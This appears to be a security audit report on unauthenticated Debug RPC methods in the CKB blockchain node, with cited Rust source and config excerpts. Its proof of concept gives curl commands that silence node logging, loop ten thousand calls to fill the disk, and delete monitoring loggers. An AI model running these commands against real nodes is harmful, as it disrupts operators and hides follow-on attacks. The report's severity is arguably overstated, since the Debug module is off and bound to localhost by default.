### Title
Unrestricted Access to Privileged Debug RPC Methods Allows Any Caller to Mutate Node Logging State - (File: `rpc/src/module/debug.rs`)

### Summary

The `Debug` RPC module exposes three privileged operations — `update_main_logger`, `set_extra_logger`, and `jemalloc_profiling_dump` — with no caller identity verification whatsoever. `DebugRpcImpl` carries zero authentication state and the RPC server (`rpc/src/server.rs`) mounts no auth middleware. Any RPC caller who can reach the endpoint can suppress all node logging, create or delete log files on the server filesystem, and trigger heap dumps, with no credential or identity check standing in the way.

### Finding Description

The external report's root cause is a function that validates a *parameter value* rather than the *caller's identity*, letting any caller pass the correct parameter to bypass the guard. The CKB analog is structurally identical: `set_extra_logger` performs a name-format check (`check_extra_logger_name`) that validates the logger name is alphanumeric/`-`/`_`, but performs no check on who is calling. This is the direct parallel to `require(creator == _creator)` — it validates a property of the input, not the identity of the sender.

**Root cause — `rpc/src/module/debug.rs`:**

```rust
pub(crate) struct DebugRpcImpl {}   // no auth token, no identity field

fn set_extra_logger(&self, name: String, config_opt: Option<ExtraLoggerConfig>) -> Result<()> {
    if let Err(err) = Logger::check_extra_logger_name(&name) {  // validates name FORMAT only
        return Err(...);
    }
    // proceeds unconditionally — no caller identity check
    if let Some(config) = config_opt {
        Logger::update_extra_logger(name, config.filter)
    } else {
        Logger::remove_extra_logger(name)
    }
    ...
}

fn update_main_logger(&self, config: MainLoggerConfig) -> Result<()> {
    // only check: are all fields None? — not a caller identity check
    if filter.is_none() && to_stdout.is_none() && to_file.is_none() && color.is_none() {
        return Ok(());
    }
    Logger::update_main_logger(filter, to_stdout, to_file, color)...
}
```

The RPC server (`rpc/src/server.rs`) starts a plain HTTP/TCP/WebSocket listener with no authentication middleware. `enable_debug` in `rpc/src/service_builder.rs` mounts `DebugRpcImpl {}` directly with no token or IP guard.

**Exploit path:**

1. Attacker reaches the RPC endpoint (any caller with network access to the configured `listen_address`).
2. Calls `update_main_logger` with `{"filter": "off", "to_stdout": false, "to_file": false}` — all node logging is silenced.
3. Calls `set_extra_logger` with a valid alphanumeric name and a non-null config — creates arbitrary `.log` files in the node's log directory. Repeated calls with distinct names exhaust disk space.
4. Calls `set_extra_logger` with `config_opt: null` — removes existing extra loggers, disrupting operator monitoring.
5. Calls `jemalloc_profiling_dump` — creates heap dump files on the server filesystem.

### Impact Explanation

- **Log suppression**: An attacker silences all node logging by setting `filter: "off"` and disabling stdout/file output. Security-relevant events (peer bans, consensus errors, tx-pool rejections) become invisible to the operator, enabling follow-on attacks to proceed undetected.
- **Disk exhaustion**: Repeated `set_extra_logger` calls with distinct valid names create unbounded `.log` files in the log directory, potentially filling the disk and crashing the node.
- **Monitoring disruption**: Removing existing extra loggers destroys operator-configured monitoring pipelines.
- **Heap dump creation**: `jemalloc_profiling_dump` writes heap dump files to the working directory, consuming disk space and potentially exposing memory layout.

### Likelihood Explanation

The `Debug` module is a documented, supported module listed in `ckb.toml` and enabled in dev/integration configurations. The RPC defaults to `127.0.0.1:8114` but is routinely exposed to the network by node operators running dApp backends, wallets, and monitoring tools. The RESEARCHER.md explicitly lists "Malicious API/RPC/web client submitting crafted inputs at scale" as a valid attacker profile and "RPC caller" as an in-scope entry point. No credential, token, or IP allowlist is enforced at the code level — the only guard is the OS-level bind address, which operators frequently change.

### Recommendation

Add caller identity verification to all `Debug` RPC methods. Options in order of strength:

1. **Token-based auth**: Require a secret token (configured in `ckb.toml`) to be passed as an HTTP header or RPC parameter; validate it in `DebugRpcImpl` before executing any method.
2. **IP allowlist**: Enforce a configurable allowlist of permitted source IPs for the `Debug` module at the RPC server layer.
3. **Module-level disable by default**: Ensure the `Debug` module is disabled in all non-dev configurations and document that enabling it on a network-exposed RPC is a critical misconfiguration.

The `set_extra_logger` name check (`check_extra_logger_name`) must not be mistaken for an authorization guard — it validates input format only and provides no identity assurance.

### Proof of Concept

```bash
# Silence all node logging — no credentials required
curl -s -X POST http://<node-rpc>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"update_main_logger","params":[{"filter":"off","to_stdout":false,"to_file":false,"color":null}],"id":1}'

# Create log files to exhaust disk (repeat with different names)
for i in $(seq 1 10000); do
  curl -s -X POST http://<node-rpc>:8114 \
    -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"set_extra_logger\",\"params\":[\"logger${i}\",{\"filter\":\"trace\"}],\"id\":1}"
done

# Remove an existing extra logger
curl -s -X POST http://<node-rpc>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"set_extra_logger","params":["mymonitor",null],"id":1}'
```

All three calls succeed with `{"result":null}` — no authentication, no identity check, no rejection. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** rpc/src/module/debug.rs (L38-95)
```rust
#[derive(Clone)]
pub(crate) struct DebugRpcImpl {}

#[async_trait]
impl DebugRpc for DebugRpcImpl {
    fn jemalloc_profiling_dump(&self) -> Result<String> {
        let timestamp = time::SystemTime::now()
            .duration_since(time::SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let filename = format!("ckb-jeprof.{timestamp}.heap");
        match ckb_memory_tracker::jemalloc_profiling_dump(&filename) {
            Ok(()) => Ok(filename),
            Err(err) => Err(Error {
                code: InternalError,
                message: err,
                data: None,
            }),
        }
    }

    fn update_main_logger(&self, config: MainLoggerConfig) -> Result<()> {
        let MainLoggerConfig {
            filter,
            to_stdout,
            to_file,
            color,
        } = config;
        if filter.is_none() && to_stdout.is_none() && to_file.is_none() && color.is_none() {
            return Ok(());
        }
        Logger::update_main_logger(filter, to_stdout, to_file, color).map_err(|err| Error {
            code: InternalError,
            message: err,
            data: None,
        })
    }

    fn set_extra_logger(&self, name: String, config_opt: Option<ExtraLoggerConfig>) -> Result<()> {
        if let Err(err) = Logger::check_extra_logger_name(&name) {
            return Err(Error {
                code: InternalError,
                message: err,
                data: None,
            });
        }
        if let Some(config) = config_opt {
            Logger::update_extra_logger(name, config.filter)
        } else {
            Logger::remove_extra_logger(name)
        }
        .map_err(|err| Error {
            code: InternalError,
            message: err,
            data: None,
        })
    }
}
```

**File:** util/src/strings.rs (L18-31)
```rust
pub fn check_if_identifier_is_valid(ident: &str) -> Result<(), String> {
    if ident.is_empty() {
        return Err("the identifier shouldn't be empty".to_owned());
    }
    if ident
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        Ok(())
    } else {
        Err(format!(
            "Invalid identifier \"{ident}\", the identifier can only contain alphabets, digits, `-`, and `_`"
        ))
    }
```

**File:** util/logger-service/src/lib.rs (L277-290)
```rust
                        Ok(Message::UpdateExtraLogger(name, filter)) => {
                            let file = log_dir.clone().join(name.clone() + ".log");
                            let file_res = Self::open_log_file(&file);
                            if let Ok(file) = file_res {
                                extra_files.insert(name.clone(), file);
                                extra_loggers_for_update
                                    .write()
                                    .insert(name, ExtraLogger { filter });
                            }
                        }
                        Ok(Message::RemoveExtraLogger(name)) => {
                            extra_loggers_for_update.write().remove(&name);
                            extra_files.remove(&name);
                        }
```

**File:** rpc/src/service_builder.rs (L192-196)
```rust
    /// Mounts methods from module Debug if it is enabled in the config.
    pub fn enable_debug(mut self) -> Self {
        let methods = DebugRpcImpl {};
        set_rpc_module_methods!(self, "Debug", debug_enable, add_debug_rpc_methods, methods)
    }
```

**File:** rpc/src/server.rs (L52-95)
```rust
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }

        let rpc = Arc::new(io_handler);

        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };

        let tcp_address = if let Some(addr) = config.tcp_listen_address {
            let local_addr = handler.block_on(Self::start_tcp_server(rpc, addr, handler.clone()));
            if let Ok(addr) = &local_addr {
                info!("Listen TCP RPCServer on address: {}", addr);
            };
            local_addr.ok()
        } else {
            None
        };

        Self {
            http_address,
            tcp_address,
            ws_address,
        }
    }
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
